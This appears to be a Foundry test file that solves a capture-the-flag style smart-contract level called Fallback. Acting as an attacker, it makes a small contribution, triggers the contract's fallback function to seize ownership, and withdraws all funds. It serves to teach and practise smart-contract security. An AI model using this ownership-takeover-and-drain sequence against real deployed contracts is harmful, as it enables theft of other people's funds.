// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/01_Fallback.sol";

contract FallbackTest is Test {
    Fallback _fallback; // fallback is reserved in solidity
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        vm.deal(attacker, 2 wei); // Fund attacker

        _fallback = new Fallback();

    }

    function testSolution() public {
        vm.startPrank(attacker);
        
        _fallback.contribute{value:1 wei}();

        address(_fallback).call{value:1 wei}("");

        _fallback.withdraw();

        assertEq(_fallback.owner(), attacker, "Attacker is not the owner!");
        assertEq(address(_fallback).balance, 0, "Fallback contract still has funds!");
    }
}
